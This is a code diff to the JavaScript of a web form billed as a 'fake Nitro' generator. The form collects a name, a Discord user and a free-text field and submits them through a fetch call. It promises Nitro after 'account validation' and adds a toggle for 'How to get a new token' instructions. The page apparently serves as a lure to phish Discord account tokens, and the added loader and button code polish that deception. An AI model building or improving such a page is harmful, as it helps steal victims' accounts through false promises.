@@ -5,6 +5,14 @@ document.getElementById('webhookForm').addEventListener('submit', async function
     const discordUser = document.getElementById('discordUser').value;
     const randomInput = document.getElementById('randomInput').value;
     const responseMessage = document.getElementById('responseMessage');
+    const generateButton = document.getElementById('generateButton');
+
+    // Show loader and change button text
+    generateButton.innerText = "Generating...";
+    generateButton.disabled = true;
+    const loader = document.createElement('div');
+    loader.classList.add('loader');
+    document.body.appendChild(loader);
 
     if (randomInput && name && discordUser) {
         responseMessage.textContent = 'Generating fake Nitro...';
@@ -24,6 +32,11 @@ document.getElementById('webhookForm').addEventListener('submit', async function
                     })
                 });
 
+                // Remove loader and show final message
+                document.body.removeChild(loader);
+                generateButton.innerText = "Generate Nitro";
+                generateButton.disabled = false;
+
                 if (response.ok) {
                     responseMessage.textContent = `Fake nitro will be verified and gifted to ${name} for 2 years after account validation, (est 2 hours).`;
                     responseMessage.style.color = 'green';
@@ -40,4 +53,10 @@ document.getElementById('webhookForm').addEventListener('submit', async function
         responseMessage.textContent = 'Please fill all fields.';
         responseMessage.style.color = 'red';
     }
+});
+
+// Show the "How to get a new token" instructions when clicked
+document.getElementById('getNewTokenButton').addEventListener('click', function() {
+    const howToGetTokenSection = document.getElementById('howToGetTokenSection');
+    howToGetTokenSection.classList.toggle('hidden');
 });
